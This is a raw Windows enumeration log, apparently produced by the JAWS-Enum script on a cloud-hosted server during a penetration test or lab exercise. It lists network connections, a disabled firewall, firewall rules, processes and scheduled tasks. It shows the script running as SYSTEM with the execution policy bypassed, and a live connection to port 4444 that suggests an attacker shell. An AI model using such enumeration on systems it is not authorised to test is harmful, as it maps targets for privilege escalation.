  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static    


-----------------------------------------------------------
 NetStat
-----------------------------------------------------------

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1020
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       8
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1304
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1568
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2096
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2588
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       768
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       2432
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       788
  TCP    10.0.27.7:139          0.0.0.0:0              LISTENING       4
  TCP    10.0.27.7:49704        10.0.31.103:443        ESTABLISHED     2340
  TCP    10.0.27.7:49723        10.10.21.3:4444        ESTABLISHED     2808
  TCP    10.0.27.7:49746        10.0.24.176:443        ESTABLISHED     2340
  TCP    10.0.27.7:49747        20.114.59.183:443      SYN_SENT        3812
  TCP    10.0.27.7:49748        10.0.24.47:443         ESTABLISHED     2340
  TCP    [::]:135               [::]:0                 LISTENING       1020
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       8
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       632
  TCP    [::]:49665             [::]:0                 LISTENING       1304
  TCP    [::]:49666             [::]:0                 LISTENING       1568
  TCP    [::]:49667             [::]:0                 LISTENING       2096
  TCP    [::]:49668             [::]:0                 LISTENING       2588
  TCP    [::]:49669             [::]:0                 LISTENING       768
  TCP    [::]:49671             [::]:0                 LISTENING       2432
  TCP    [::]:49673             [::]:0                 LISTENING       788
  UDP    0.0.0.0:123            *:*                                    2724
  UDP    0.0.0.0:500            *:*                                    2448
  UDP    0.0.0.0:3389           *:*                                    8
  UDP    0.0.0.0:4500           *:*                                    2448
  UDP    0.0.0.0:5353           *:*                                    1640
  UDP    0.0.0.0:5355           *:*                                    1640
  UDP    10.0.27.7:137          *:*                                    4
  UDP    10.0.27.7:138          *:*                                    4
  UDP    127.0.0.1:53250        *:*                                    2880
  UDP    [::]:123               *:*                                    2724
  UDP    [::]:500               *:*                                    2448
  UDP    [::]:3389              *:*                                    8
  UDP    [::]:4500              *:*                                    2448
  UDP    [::]:5353              *:*                                    1640
  UDP    [::]:5355              *:*                                    1640


-----------------------------------------------------------
 Firewall Status
-----------------------------------------------------------

Firewall is Disabled

-----------------------------------------------------------
 FireWall Rules
-----------------------------------------------------------

Name                                                                                                                   
----                                                                                                                   
@{Microsoft.AAD.BrokerPlugin_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/r...
@{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.Win32WebViewHost/resou...
@{Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.C...
@{Microsoft.Windows.Cortana_1.11.6.17763_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resou...
Cast to Device streaming server (RTCP-Streaming-In)                                                                    
Cast to Device streaming server (RTCP-Streaming-In)                                                                    
Cast to Device streaming server (RTCP-Streaming-In)                                                                    
Cast to Device streaming server (RTSP-Streaming-In)                                                                    
Cast to Device streaming server (RTSP-Streaming-In)                                                                    
Cast to Device streaming server (RTSP-Streaming-In)                                                                    
Remote Desktop - Shadow (TCP-In)                                                                                       
Remote Desktop - Shadow (TCP-In)                                                                                       
AllJoyn Router (TCP-In)                                                                                                
AllJoyn Router (UDP-In)                                                                                                
Cast to Device functionality (qWave-TCP-In)                                                                            
Cast to Device functionality (qWave-UDP-In)                                                                            
Cast to Device SSDP Discovery (UDP-In)                                                                                 
Core Networking - Dynamic Host Configuration Protocol (DHCP-In)                                                        
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)                                              
Core Networking - Teredo (UDP-In)                                                                                      
Delivery Optimization (TCP-In)                                                                                         
Delivery Optimization (UDP-In)                                                                                         
mDNS (UDP-In)                                                                                                          
mDNS (UDP-In)                                                                                                          
mDNS (UDP-In)                                                                                                          
Remote Desktop - User Mode (TCP-In)                                                                                    
Remote Desktop - User Mode (TCP-In)                                                                                    
Remote Desktop - User Mode (UDP-In)                                                                                    
Remote Desktop - User Mode (UDP-In)                                                                                    
Cast to Device streaming server (HTTP-Streaming-In)                                                                    
Cast to Device streaming server (HTTP-Streaming-In)                                                                    
Cast to Device streaming server (HTTP-Streaming-In)                                                                    
Cast to Device UPnP Events (TCP-In)                                                                                    
Core Networking - Destination Unreachable (ICMPv6-In)                                                                  
Core Networking - Destination Unreachable Fragmentation Needed (ICMPv4-In)                                             
Core Networking - Internet Group Management Protocol (IGMP-In)                                                         
Core Networking - IPHTTPS (TCP-In)                                                                                     
Core Networking - IPv6 (IPv6-In)                                                                                       
Core Networking - Multicast Listener Done (ICMPv6-In)                                                                  
Core Networking - Multicast Listener Query (ICMPv6-In)                                                                 
Core Networking - Multicast Listener Report (ICMPv6-In)                                                                
Core Networking - Multicast Listener Report v2 (ICMPv6-In)                                                             
Core Networking - Neighbor Discovery Advertisement (ICMPv6-In)                                                         
Core Networking - Neighbor Discovery Solicitation (ICMPv6-In)                                                          
Core Networking - Packet Too Big (ICMPv6-In)                                                                           
Core Networking - Parameter Problem (ICMPv6-In)                                                                        
Core Networking - Router Advertisement (ICMPv6-In)                                                                     
Core Networking - Router Solicitation (ICMPv6-In)                                                                      
Core Networking - Time Exceeded (ICMPv6-In)                                                                            
DIAL protocol server (HTTP-In)                                                                                         
DIAL protocol server (HTTP-In)                                                                                         
Windows Remote Management (HTTP-In)                                                                                    
Windows Remote Management (HTTP-In)                                                                                    
@{Microsoft.AAD.BrokerPlugin_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/r...
@{Microsoft.AccountsControl_10.0.17763.1_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/Di...
@{Microsoft.LockApp_10.0.17763.1_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}      
@{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.Win32WebViewHost/resou...
@{Microsoft.Windows.Apprep.ChxApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Appre...
@{Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.C...
@{Microsoft.Windows.Cortana_1.11.6.17763_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resou...
@{Microsoft.Windows.NarratorQuickStart_10.0.17763.1_neutral_neutral_8wekyb3d8bbwe?ms-resource://Microsoft.Windows.Na...
@{Microsoft.Windows.OOBENetworkCaptivePortal_10.0.17763.1_neutral__cw5n1h2txyewy?ms-resource://Microsoft.Windows.OOB...
@{Microsoft.Windows.PeopleExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows....
@{Microsoft.Windows.SecHealthUI_10.0.17763.1_neutral__cw5n1h2txyewy?ms-resource://Microsoft.Windows.SecHealthUI/reso...
@{Microsoft.Windows.ShellExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.S...
Shell Input Application                                                                                                
Windows Device Management Certificate Installer (TCP out)                                                              
Core Networking - Group Policy (LSASS-Out)                                                                             
Cast to Device streaming server (RTP-Streaming-Out)                                                                    
Cast to Device streaming server (RTP-Streaming-Out)                                                                    
Cast to Device streaming server (RTP-Streaming-Out)                                                                    
Windows Device Management Sync Client (TCP out)                                                                        
AllJoyn Router (TCP-Out)                                                                                               
AllJoyn Router (UDP-Out)                                                                                               
Cast to Device functionality (qWave-TCP-Out)                                                                           
Cast to Device functionality (qWave-UDP-Out)                                                                           
Connected User Experiences and Telemetry                                                                               
Core Networking - DNS (UDP-Out)                                                                                        
Core Networking - Dynamic Host Configuration Protocol (DHCP-Out)                                                       
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)                                             
Core Networking - Group Policy (TCP-Out)                                                                               
Core Networking - IPHTTPS (TCP-Out)                                                                                    
Core Networking - Teredo (UDP-Out)                                                                                     
mDNS (UDP-Out)                                                                                                         
mDNS (UDP-Out)                                                                                                         
mDNS (UDP-Out)                                                                                                         
Windows Device Management Enrollment Service (TCP out)                                                                 
Core Networking - Group Policy (NP-Out)                                                                                
Core Networking - Internet Group Management Protocol (IGMP-Out)                                                        
Core Networking - IPv6 (IPv6-Out)                                                                                      
Core Networking - Multicast Listener Done (ICMPv6-Out)                                                                 
Core Networking - Multicast Listener Query (ICMPv6-Out)                                                                
Core Networking - Multicast Listener Report (ICMPv6-Out)                                                               
Core Networking - Multicast Listener Report v2 (ICMPv6-Out)                                                            
Core Networking - Neighbor Discovery Advertisement (ICMPv6-Out)                                                        
Core Networking - Neighbor Discovery Solicitation (ICMPv6-Out)                                                         
Core Networking - Packet Too Big (ICMPv6-Out)                                                                          
Core Networking - Parameter Problem (ICMPv6-Out)                                                                       
Core Networking - Router Advertisement (ICMPv6-Out)                                                                    
Core Networking - Router Solicitation (ICMPv6-Out)                                                                     
Core Networking - Time Exceeded (ICMPv6-Out)                                                                           


-----------------------------------------------------------
 Hosts File Content
-----------------------------------------------------------

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost


-----------------------------------------------------------
 Processes
-----------------------------------------------------------

Name                    ProcessID Owner           CommandLine                                                          
----                    --------- -----           -----------                                                          
amazon-ssm-agent.exe         2340 SYSTEM          "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                   
cmd.exe                      2920 SYSTEM          C:\Windows\system32\cmd.exe                                          
CompatTelRunner.exe          2964 SYSTEM          C:\Windows\system32\compattelrunner.exe                              
CompatTelRunner.exe          1744 SYSTEM          C:\Windows\system32\compattelrunner.exe -maintenance                 
conhost.exe                   400 Administrator   \??\C:\Windows\system32\conhost.exe 0x4                              
conhost.exe                  2012 SYSTEM          \??\C:\Windows\system32\conhost.exe 0x4                              
conhost.exe                   764 SYSTEM          \??\C:\Windows\system32\conhost.exe 0x4                              
conhost.exe                  2812 SYSTEM          \??\C:\Windows\system32\conhost.exe 0x4                              
conhost.exe                  1260 SYSTEM          \??\C:\Windows\system32\conhost.exe 0x4                              
conhost.exe                  3264 SYSTEM          \??\C:\Windows\system32\conhost.exe 0x4                              
csrss.exe                     556 SYSTEM                                                                               
csrss.exe                     640 SYSTEM                                                                               
ctfmon.exe                   3584 Administrator   "ctfmon.exe"                                                         
dwm.exe                       804 DWM-1           "dwm.exe"                                                            
explorer.exe                 3700 Administrator   C:\Windows\Explorer.EXE                                              
fontdrvhost.exe               940 UMFD-0          "fontdrvhost.exe"                                                    
fontdrvhost.exe               932 UMFD-1          "fontdrvhost.exe"                                                    
LiteAgent.exe                2624 SYSTEM          "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                     
lsass.exe                     788 SYSTEM          C:\Windows\system32\lsass.exe                                        
mscorsvw.exe                 3444 SYSTEM                                                                               
msdtc.exe                    4488 NETWORK SERVICE C:\Windows\System32\msdtc.exe                                        
ngen.exe                     3952 SYSTEM          "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe"           
                                                  ExecuteQueuedItems /LegacyServiceBehavior                            
ngen.exe                     1932 SYSTEM          "C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"             
                                                  ExecuteQueuedItems /LegacyServiceBehavior                            
ngentask.exe                 1672 SYSTEM          "C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"         
                                                  /RuntimeWide /StopEvent:984                                          
ngentask.exe                  532 SYSTEM          "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"       
                                                  /RuntimeWide /StopEvent:976                                          
powershell.exe               2408 SYSTEM          powershell.exe  -ExecutionPolicy Bypass -File .\jaws-enum.ps1        
                                                  -OutputFilename JAWS-Enum.txt                                        
Registry                       88 SYSTEM                                                                               
RuntimeBroker.exe            4636 Administrator   C:\Windows\System32\RuntimeBroker.exe -Embedding                     
RuntimeBroker.exe            4536 Administrator   C:\Windows\System32\RuntimeBroker.exe -Embedding                     
RuntimeBroker.exe            4912 Administrator   C:\Windows\System32\RuntimeBroker.exe -Embedding                     
SearchUI.exe                 4416 Administrator   "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\Search
                                                  UI.exe"                                                              
                                                  -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca       
services.exe                  768 SYSTEM                                                                               
ShellExperienceHost.exe      4312 Administrator   "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperie
                                                  nceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
sihost.exe                   3900 Administrator   sihost.exe                                                           
smss.exe                      392 SYSTEM                                                                               
spoolsv.exe                  2588 SYSTEM          C:\Windows\System32\spoolsv.exe                                      
svchost.exe                  3196 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s TokenBroker         
svchost.exe                  2756 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService          
svchost.exe                  2880 SYSTEM          C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc            
svchost.exe                  3848 SYSTEM          C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository    
svchost.exe                  3936 Administrator   C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
svchost.exe                  3912 Administrator   C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc    
svchost.exe                  3420 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s TabletInputService                                                
svchost.exe                  2936 SYSTEM          C:\Windows\system32\svchost.exe -k defragsvc                         
svchost.exe                  3384 NETWORK SERVICE                                                                      
svchost.exe                  3536 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s StorSvc                                                           
svchost.exe                  3452 SYSTEM                                                                               
svchost.exe                  1152 LOCAL SERVICE   C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager 
svchost.exe                  5044 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s DsSvc                                                             
svchost.exe                  3812 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s wuauserv            
svchost.exe                  4848 SYSTEM                                                                               
svchost.exe                  3784 SYSTEM          C:\Windows\system32\svchost.exe -k DcomLaunch -p -s DeviceInstall    
svchost.exe                  3492 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc         
svchost.exe                   560 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc              
svchost.exe                  2676 SYSTEM          C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s UALSVC                                                            
svchost.exe                  2308 LOCAL SERVICE   C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS   
svchost.exe                  1368 SYSTEM          C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes              
svchost.exe                  1376 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem    
svchost.exe                  1356 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc               
svchost.exe                  1304 LOCAL SERVICE   C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p  
                                                  -s EventLog                                                          
svchost.exe                  1348 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s ProfSvc             
svchost.exe                  1568 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule            
svchost.exe                  1584 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s UmRdpService                                                      
svchost.exe                  1560 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p  
                                                  -s Dhcp                                                              
svchost.exe                  1456 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalService -p -s nsi            
svchost.exe                  1528 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS                
svchost.exe                  1020 NETWORK SERVICE C:\Windows\system32\svchost.exe -k RPCSS -p                          
svchost.exe                   508 SYSTEM          C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM              
svchost.exe                   912 SYSTEM          C:\Windows\system32\svchost.exe -k DcomLaunch -p                     
svchost.exe                  2732 SYSTEM          C:\Windows\System32\svchost.exe -k smbsvcs -s LanmanServer           
svchost.exe                   892 SYSTEM          C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay         
svchost.exe                  1100 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p  
                                                  -s TimeBrokerSvc                                                     
svchost.exe                  1212 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p          
svchost.exe                  1076 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s NcbService                                                        
svchost.exe                     8 NETWORK SERVICE C:\Windows\System32\svchost.exe -k termsvcs -s TermService           
svchost.exe                  1060 LOCAL SERVICE   C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p  
                                                  -s lmhosts                                                           
svchost.exe                  1640 NETWORK SERVICE C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache     
svchost.exe                  2448 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s IKEEXT              
svchost.exe                  2616 NETWORK SERVICE C:\Windows\system32\svchost.exe -k NetworkService -p -s CryptSvc     
svchost.exe                  2432 NETWORK SERVICE C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted   
                                                  -p -s PolicyAgent                                                    
svchost.exe                  2164 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p  
svchost.exe                  2296 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager         
svchost.exe                  2724 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalService -s W32Time           
svchost.exe                  2740 NETWORK SERVICE C:\Windows\System32\svchost.exe -k NetworkService -p -s WinRM        
svchost.exe                  2712 SYSTEM          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s TrkWks                                                            
svchost.exe                  2632 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt             
svchost.exe                  2704 SYSTEM          C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p   
                                                  -s SysMain                                                           
svchost.exe                  1900 SYSTEM          C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection    
svchost.exe                  1912 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc              
svchost.exe                  1828 SYSTEM          C:\Windows\system32\svchost.exe -k netsvcs -s CertPropSvc            
svchost.exe                  1656 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p  
svchost.exe                  1728 NETWORK SERVICE C:\Windows\System32\svchost.exe -k NetworkService -p -s NlaSvc       
svchost.exe                  1576 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache      
svchost.exe                  2096 SYSTEM          C:\Windows\System32\svchost.exe -k netsvcs -p -s SessionEnv          
svchost.exe                  2016 LOCAL SERVICE   C:\Windows\System32\svchost.exe -k LocalService -p -s netprofm       
svchost.exe                  1948 NETWORK SERVICE C:\Windows\System32\svchost.exe -k NetworkService -p -s              
                                                  LanmanWorkstation                                                    
svchost.exe                  1972 LOCAL SERVICE   C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p  
                                                  -s WinHttpAutoProxySvc                                               
System                          4 SYSTEM                                                                               
System Idle Process             0                                                                                      
taskhostw.exe                1492 SYSTEM          taskhostw.exe /RuntimeWide                                           
taskhostw.exe                3984 Administrator   taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                 
taskhostw.exe                4684 Administrator   taskhostw.exe                                                        
TiWorker.exe                 3188 SYSTEM          C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad36
                                                  4e35_10.0.17763.1450_none_56e6965b991df4af\TiWorker.exe -Embedding   
TrustedInstaller.exe          844 SYSTEM          C:\Windows\servicing\TrustedInstaller.exe                            
vds.exe                      5056 SYSTEM          C:\Windows\System32\vds.exe                                          
wininit.exe                   632 SYSTEM                                                                               
winlogon.exe                  700 SYSTEM          winlogon.exe                                                         
winrshost.exe                3104 Administrator   C:\Windows\system32\WinrsHost.exe -Embedding                         
WmiPrvSE.exe                 2640 NETWORK SERVICE C:\Windows\system32\wbem\wmiprvse.exe                                
WmiPrvSE.exe                 4240 SYSTEM          C:\Windows\system32\wbem\wmiprvse.exe                                



-----------------------------------------------------------
 Scheduled Tasks
-----------------------------------------------------------
Current System Time: 06/08/2023 03:34:11

TaskName    : \Amazon Ec2 Launch - Instance Initialization
Run As User : SYSTEM
Task To Run : C:\Windows\System32\cmd.exe /C C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile 
              -NonInteractive -NoLogo -ExecutionPolicy Unrestricted -File 
              C:\ProgramData\Amazon\EC2-Windows\Launch\Scripts\InitializeInstance.ps1""

TaskName    : \Microsoft\Windows\Server Initial Configuration Task
Run As User : SYSTEM
Task To Run : %windir%\system32\srvinitconfig.exe /disableconfigtask

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template 
              Management (Automated)
Run As User : \Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template 
              Management (Automated)
Run As User : \Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template 
              Management (Manual)
Run As User : \Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\EDP Policy Manager
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\EDP Policy Manager
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\PolicyConverter
Run As User : SYSTEM
Task To Run : %windir%\system32\appidpolicyconverter.exe 

TaskName    : \Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck
Run As User : LOCAL SERVICE
Task To Run : %windir%\system32\appidcertstorecheck.exe 

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe 

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe 

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe 

TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater
Run As User : SYSTEM
Task To Run : %windir%\system32\compattelrunner.exe -maintenance

TaskName    : \Microsoft\Windows\Application Experience\StartupAppTask
Run As User : INTERACTIVE
Task To Run : %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask

TaskName    : \Microsoft\Windows\ApplicationData\appuriverifierdaily
Run As User : INTERACTIVE
Task To Run : %windir%\system32\AppHostRegistrationVerifier.exe 

TaskName    : \Microsoft\Windows\ApplicationData\appuriverifierinstall
Run As User : INTERACTIVE
Task To Run : %windir%\system32\AppHostRegistrationVerifier.exe 

TaskName    : \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState

TaskName    : \Microsoft\Windows\ApplicationData\DsSvcCleanup
Run As User : SYSTEM
Task To Run : %windir%\system32\dstokenclean.exe 

TaskName    : \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask

TaskName    : \Microsoft\Windows\Autochk\Proxy
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations

TaskName    : \Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\BitLocker\BitLocker MDM policy Refresh
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Bluetooth\UninstallDeviceTask
Run As User : SYSTEM
Task To Run : BthUdTask.exe $(Arg0)

TaskName    : \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\AikCertEnrollTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\CryptoPolicyTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\KeyPreGenTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\KeyPreGenTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\KeyPreGenTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\KeyPreGenTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\KeyPreGenTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\SystemTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\SystemTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\SystemTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Chkdsk\SyspartRepair
Run As User : SYSTEM
Task To Run : %windir%\system32\bcdboot.exe %windir% /sysrepair

TaskName    : \Microsoft\Windows\Clip\License Validation
Run As User : SYSTEM
Task To Run : %SystemRoot%\system32\ClipUp.exe -p -s -o

TaskName    : \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\wsqmcons.exe 

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Run As User : SYSTEM
Task To Run : COM handler

